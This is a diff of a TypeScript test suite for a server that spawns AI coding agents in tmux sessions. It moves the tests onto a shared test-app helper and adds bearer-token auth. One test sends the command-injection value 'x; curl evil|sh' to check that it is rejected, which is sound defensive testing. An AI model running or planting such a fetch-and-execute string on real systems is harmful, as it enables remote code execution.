@@ -144,75 +144,53 @@ it('POST /tasks with body {title} generates an id and sets status open', async (
 });
 
 it('POST /sessions with invalid exec returns 400 and spawns nothing', async () => {
-  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
-  const tasks = new TaskStore(db); tasks.create({ id: 'elowen-1', project_id: 1, title: 'X' });
-  const tmux = new FakeTmuxDriver();
-  const app = createServer({
-    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
-    engine: null as any, spawn: new SpawnService({ prompts: promptSeam, tmux, agents: new AgentStore(db) }), tmux,
-    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
-  });
-  const res = await app.request('/sessions', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-1', exec: 'x; curl evil|sh' }) });
+  const { app, token, deps } = await makeTestApp();
+  deps.tasks.create({ id: 'elowen-1', project_id: 1, title: 'X' });
+  const res = await app.request('/sessions', { method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-1', exec: 'x; curl evil|sh' }) });
   expect(res.status).toBe(400);
   expect(await res.json()).toMatchObject({ error: 'exec not allowed' });
-  expect(await tmux.list()).toHaveLength(0);
+  expect(await deps.tmux.list()).toHaveLength(0);
 });
 
+
 it('POST /sessions launches an agent on a task and marks it in_progress', async () => {
-  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
-  const tasks = new TaskStore(db); tasks.create({ id: 'elowen-1', project_id: 1, title: 'X' });
-  const tmux = new FakeTmuxDriver();
-  const app = createServer({
-    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
-    engine: null as any, spawn: new SpawnService({ prompts: promptSeam, tmux, agents: new AgentStore(db) }), tmux,
-    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
-  });
-  const res = await app.request('/sessions', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-1', exec: 'ollama-cloud/deepseek-v4-flash' }) });
+  const { app, token, deps } = await makeTestApp();
+  deps.tasks.create({ id: 'elowen-1', project_id: 1, title: 'X' });
+  const res = await app.request('/sessions', { method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-1', exec: 'ollama-cloud/deepseek-v4-flash' }) });
   expect(res.status).toBe(201);
   const body = await res.json();
   expect(body.session).toMatch(/^elowen-/);
-  expect(tasks.get('elowen-1')?.status).toBe('in_progress');
-  expect(await tmux.list()).toContain(body.session);
+  expect(deps.tasks.get('elowen-1')?.status).toBe('in_progress');
+  expect(await deps.tmux.list()).toContain(body.session);
   // spawn tags the task with exec + agent labels so the UI can show its model and link the session
-  const t1 = tasks.get('elowen-1')!;
+  const t1 = deps.tasks.get('elowen-1')!;
   expect(t1.labels).toContain('exec:ollama-cloud/deepseek-v4-flash');
   expect(t1.labels.some((l) => l.startsWith('agent:'))).toBe(true);
 });
 
+
 it('POST /sessions refuses to launch into a shared checkout another agent already holds (409)', async () => {
-  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
-  const tasks = new TaskStore(db);
-  tasks.create({ id: 'busy', project_id: 1, title: 'Busy' });
-  tasks.setStatus('busy', 'in_progress'); // a live agent already owns the project's shared checkout
-  tasks.create({ id: 'elowen-1', project_id: 1, title: 'X' });
-  const tmux = new FakeTmuxDriver();
-  const app = createServer({
-    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
-    engine: null as any, spawn: new SpawnService({ prompts: promptSeam, tmux, agents: new AgentStore(db) }), tmux,
-    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
-  });
-  const res = await app.request('/sessions', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-1', exec: 'sonnet' }) });
+  const { app, token, deps } = await makeTestApp();
+  deps.tasks.create({ id: 'busy', project_id: 1, title: 'Busy' });
+  deps.tasks.setStatus('busy', 'in_progress'); // a live agent already owns the project's shared checkout
+  deps.tasks.create({ id: 'elowen-1', project_id: 1, title: 'X' });
+  const res = await app.request('/sessions', { method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-1', exec: 'sonnet' }) });
   expect(res.status).toBe(409); // single-writer: don't double-occupy the checkout
-  expect(tasks.get('elowen-1')?.status).toBe('open'); // not flipped
-  expect(await tmux.list()).toHaveLength(0);         // nothing spawned
+  expect(deps.tasks.get('elowen-1')?.status).toBe('open'); // not flipped
+  expect(await deps.tmux.list()).toHaveLength(0);         // nothing spawned
 });
 
+
 it('GET /sessions tags each live session with its project from the agent store', async () => {
-  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (7,'elowen','/o')").run();
-  const tasks = new TaskStore(db); tasks.create({ id: 'elowen-1', project_id: 7, title: 'X' });
-  const tmux = new FakeTmuxDriver();
-  const agents = new AgentStore(db);
-  const app = createServer({
-    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
-    engine: null as any, spawn: new SpawnService({ prompts: promptSeam, tmux, agents }), tmux, agents,
-    project: { id: 7, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
-  });
-  await app.request('/sessions', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-1', exec: 'ollama-cloud/deepseek-v4-flash' }) });
-  const sessions = await (await app.request('/sessions')).json();
+  const { app, token, deps } = await makeTestApp();
+  deps.tasks.create({ id: 'elowen-1', project_id: 1, title: 'X' });
+  await app.request('/sessions', { method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-1', exec: 'ollama-cloud/deepseek-v4-flash' }) });
+  const sessions = await (await app.request('/sessions', { headers: { authorization: `Bearer ${token}` } })).json();
   expect(sessions).toHaveLength(1);
   // the daemon resolves the session's repo from the agent store (works for every role, not just workers)
-  expect(sessions[0].projectId).toBe(7);
+  expect(sessions[0].projectId).toBe(1);
 });
+
 
 it('PATCH /missions/:id pauses (drops from active) and resumes', async () => {
   // Served by the agents plugin's root-mounted routes: the REAL engine pauses (kills agents, reverts
@@ -228,30 +206,19 @@ it('PATCH /missions/:id pauses (drops from active) and resumes', async () => {
 });
 
 it('POST /sessions rejects an exec disallowed by config', async () => {
-  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
-  const tasks = new TaskStore(db); tasks.create({ id: 'elowen-1', project_id: 1, title: 'X' });
-  const config = new ConfigStore(db); config.update({ allowedExecs: ['sonnet'] }); // only sonnet allowed
-  const tmux = new FakeTmuxDriver();
-  const app = createServer({
-    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
-    engine: null as any, spawn: new SpawnService({ prompts: promptSeam, tmux, agents: new AgentStore(db) }), tmux,
-    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config,
-  });
-  const res = await app.request('/sessions', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-1', exec: 'codex:gpt-5.4' }) });
+  const { app, token, deps } = await makeTestApp();
+  deps.tasks.create({ id: 'elowen-1', project_id: 1, title: 'X' });
+  deps.config.update({ allowedExecs: ['sonnet'] }); // only sonnet allowed
+  const res = await app.request('/sessions', { method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-1', exec: 'codex:gpt-5.4' }) });
   expect(res.status).toBe(400);
-  expect(await tmux.list()).toEqual([]);
+  expect(await deps.tmux.list()).toEqual([]);
 });
 
+
 it('GET /sessions/:name/stream survives a dead/missing session (empty pane)', async () => {
-  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
-  const tmux = new FakeTmuxDriver(); // no pane set for 'elowen-dead' → returns ''
-  const app = createServer({
-    tasks: new TaskStore(db), readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
-    engine: null as any, spawn: null as any, tmux, project: { id: 1, path: '/o' },
-    fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
-  });
+  const { app, token } = await makeTestApp(); // no pane set for 'elowen-dead' → returns ''
   const ctrl = new AbortController();
-  const res = await app.request('/sessions/elowen-dead/stream', { signal: ctrl.signal });
+  const res = await app.request('/sessions/elowen-dead/stream', { signal: ctrl.signal, headers: { authorization: `Bearer ${token}` } });
   expect(res.status).toBe(200);
   expect(res.headers.get('content-type')).toContain('text/event-stream');
   const reader = res.body!.getReader();
@@ -263,16 +230,12 @@ it('GET /sessions/:name/stream survives a dead/missing session (empty pane)', as
   ctrl.abort(); await reader.cancel();
 });
 
+
 it('GET /sessions/:name/stream emits a first pane frame', async () => {
-  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
-  const tmux = new FakeTmuxDriver(); tmux.setPane('elowen-A', 'hello-pane');
-  const app = createServer({
-    tasks: new TaskStore(db), readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
-    engine: null as any, spawn: null as any, tmux, project: { id: 1, path: '/o' },
-    fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
-  });
+  const { app, token, deps } = await makeTestApp();
+  deps.tmux.setPane('elowen-A', 'hello-pane');
   const ctrl = new AbortController();
-  const res = await app.request('/sessions/elowen-A/stream', { signal: ctrl.signal });
+  const res = await app.request('/sessions/elowen-A/stream', { signal: ctrl.signal, headers: { authorization: `Bearer ${token}` } });
   expect(res.status).toBe(200);
   expect(res.headers.get('content-type')).toContain('text/event-stream');
   const reader = res.body!.getReader();
@@ -282,6 +245,7 @@ it('GET /sessions/:name/stream emits a first pane frame', async () => {
   expect(text).toContain('hello-pane');
   ctrl.abort(); await reader.cancel();
 });
+
 
 it('GET /events flushes an initial comment so headers reach the client immediately (no events yet)', async () => {
   // Through the web BFF proxy, a streamed response sends no HTTP headers until the first body byte.
@@ -689,22 +653,14 @@ it('GET /health surfaces the real pool: spawn failure as a stable code, never th
 });
 
 it('POST /sessions reverts the task to open when spawn.launch fails', async () => {
-  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
-  const tasks = new TaskStore(db);
-  tasks.create({ id: 'elowen-s1', project_id: 1, title: 'T', description: 'd' });
-  const tmux = new FakeTmuxDriver();
-  tmux.spawn = async () => { throw new Error('tmux exploded'); };
-  const spawn = new SpawnService({ prompts: promptSeam, tmux, agents: new AgentStore(db) });
-  const bus = new EventBus();
-  const events: ElowenEvent[] = []; bus.subscribe((e) => events.push(e));
-  const app = createServer({
-    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus,
-    engine: null as any, spawn, tmux,
-    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
-  });
-  const res = await app.request('/sessions', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-s1' }) });
+  const { app, token, deps } = await makeTestApp();
+  deps.tasks.create({ id: 'elowen-s1', project_id: 1, title: 'T', description: 'd' });
+  deps.tmux.spawn = async () => { throw new Error('tmux exploded'); };
+  const events: ElowenEvent[] = []; deps.bus.subscribe((e) => events.push(e));
+  const res = await app.request('/sessions', { method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-s1' }) });
   expect(res.status).toBe(500);
-  expect(tasks.get('elowen-s1')!.status).toBe('open'); // reverted, not left stuck in_progress
+  expect(deps.tasks.get('elowen-s1')!.status).toBe('open'); // reverted, not left stuck in_progress
   expect(events.some((e) => e.type === 'task' && e.taskId === 'elowen-s1' && e.status === 'open')).toBe(true);
 });
+
 
